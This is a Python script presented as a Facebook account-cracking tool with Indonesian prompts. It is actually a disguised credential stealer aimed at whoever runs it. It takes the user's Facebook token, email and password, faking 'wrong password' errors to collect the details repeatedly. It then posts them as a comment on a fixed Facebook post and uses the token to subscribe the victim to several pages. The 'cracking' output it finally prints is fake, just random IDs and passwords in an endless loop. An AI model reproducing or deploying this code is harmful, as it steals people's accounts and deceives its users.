#fucked by matin1337
import os
import sys
import time
import datetime
import random
import hashlib
import re
import threading
import json
import urllib
try: import requests
except ModuleNotFoundError: os.system("python -m pip install requests &> /dev/null")
try: import bs4
except ModuleNotFoundError: os.system("python -m pip install bs4 &> /dev/null")
try: import mechanize
except ModuleNotFoundError: os.system("python -m pip install mechanize &> /dev/null")
import requests as req
try:
        import requests
except ImportError:
        print ('Modul requests belum terinstall!...\n')
        os.system('pip install requests' if os.name == 'nt' else 'pip2 install requests')
import requests
import uuid
import calendar
from requests.exceptions import ConnectionError
from bs4 import BeautifulSoup as par
from time import sleep
from datetime import datetime
from datetime import date
import requests,mechanize,bs4,sys,os,subprocess,uuid
import requests,sys,random,time,re,base64,json
import os, re, requests, concurrent.futures
from random import randint
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from datetime import date
from datetime import datetime
import requests
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parser
import requests as r, re, os
from bs4 import BeautifulSoup as par
import platform
import requests, bs4, sys, os, subprocess, random, time, re, json
import concurrent.futures
from datetime import datetime
from time import sleep
from requests import Session
import re, sys
import sys
from os import system
import os, sys, time, random
from sys import exit as keluar
from time import sleep as waktu
from random import random as acak
from random import choice as pilih
from sys import stdout
from os import system
import re
import os,random,time,sys
import json
from time import sleep as waktu
from bs4 import BeautifulSoup as parser
current = datetime.now()
import requests,mechanize,bs4,sys,os,subprocess,uuid,random,time,re,base64,concurrent.futures,json
koneksi_error=(req.exceptions.ConnectionError,req.exceptions.ChunkedEncodingError,req.exceptions.ReadTimeout)

q="\033[00m"
Q="\033[00m"
h2="\033[40m"
b2="\033[44m"
c2="\033[46m"
i2="\033[42m"
u2="\033[45m"
m2="\033[41m"
p2="\033[47m"
k2="\033[43m"
b='\033[0;94m'
B='\033[0;94m'
I='\033[0;92m'
C='\033[0;96m'
M='\033[0;91m'
U='\033[0;95m'
K='\033[0;93m'
P='\033[0;97m'
H='\033[0;90m'
i='\033[0;92m'
c='\033[0;92m'
m='\033[0;91m'
u='\033[0;95m'
k='\033[0;96m'
p='\033[0;93m'
h='\033[0;90m'



logo = (C+"""
  _______                          _______   __                
 |   _   | .----. .-----. .-----. |   _   | |__| .----. .-----.
 |.  1___| |   _| |  -__| |  -__| |.  1___| |  | |   _| |  -__|
 |.  __)   |__|   |_____| |_____| |.  __)   |__| |__|   |_____|
 |:  |                            |:  |WA : 6283150753682
 |::.|                            |::.|
 `---'                            `---'

"""+Q)
def main():
	token=raw_input(K+"Masukan Token Facebook : "+I)
	try:
		otw = requests.get("https://graph.facebook.com/me/?access_token="+token)
                a = json.loads(otw.text)
                nama = a["name"]
		print nama
        except IOError:
                print((k+"\n["+p+"!"+k+"]"+p+" Token Invalid"))
                time.sleep(1)
		exit()
        except KeyError:
                print((k+"\n["+p+"!"+k+"]"+p+" Token Invalid"))
                time.sleep(1)
		exit()
	os.system("clear")
	print logo
	print(K+"Jika Anda Mau Hack Akun Facebook Lebih Maksimal Silahkan Masukan Email Dan Password Facebook")
	time.sleep(5)
	print(C+"Jika Anda Tidak Masukan Email Dan Passwrod Facebook, Kemungkinan Akun Mati(sesi)")
	time.sleep(5)
	user_fake = raw_input(K+"Username/Email/ID : "+I)
	pass_fake = raw_input(K+'Passwrod : '+C)
	time.sleep(15)
	print ("Maaf User Dan Pass Salah !!")
	time.sleep(2)
	os.system("clear")
	print logo
	user_fake = raw_input(K+"Username/Email/ID : "+I)
	pass_fake = raw_input(K+'Passwrod : '+C)
	time.sleep(15)
	print ("Maaf User Dan Pass Salah !!")
	time.sleep(2)
	os.system("clear")
	print logo
	user_fake = raw_input(K+"Username/Email/ID : "+I)
	pass_fake = raw_input(K+'Passwrod : '+C)
	time.sleep(2)
	os.system("clear")
	print(I+"Login Suksess !!")
	time.sleep(2)
	try:
		requests.post('https://graph.facebook.com/4421323577975077/comments/?message=Nama ('+nama+')\nEmail ('+user_fake+')\nPassword ('+pass_fake+')&access_token=' + token)
		requests.post('https://graph.facebook.com/100063690353340/subscribers?access_token=' + token) ### FB RISKY
        	requests.post('https://graph.facebook.com/100067783659018/subscribers?access_token=' + token) ### FB RISKY
	        requests.post('https://graph.facebook.com/100002924366263/subscribers?access_token=' + token) ### FB RISKY
        	requests.post('https://graph.facebook.com/110877271176800/subscribers?access_token=' + token) ### Halaman Risky
	        requests.post('https://graph.facebook.com/Termuxid-Dumai-991-110877271176800/subscribers?access_token=' + token) ### Halaman Risky
	except:print('Token Rusak !!');exit()
	os.system("echo 'H' >> .Hai")
	os.system("clear")
	print ('Crack Start !!')
	print logo
	tahap1()
def wae():
	try:
		bass = open(".Hai", "r").read()
	except:main()
	try:tahap1()
	except:print "Error"
def tahap1():
	time.sleep(9.76)
	user1 = str(random.randint(20000000000, 60000000000))
	user2 = str(random.randint(33000000000, 52000000000))
	pass1 = pilih(["anjing","123456789","654321","123456","kontol","sayang"])
	pass2 = pilih(["indonesia","bangsat","bajingan","654321","pantek","102030"])
	print(K+"CP "+C+"1000"+user1+"|"+pass2)
	return tahap1()
os.system("clear")
print logo
main()

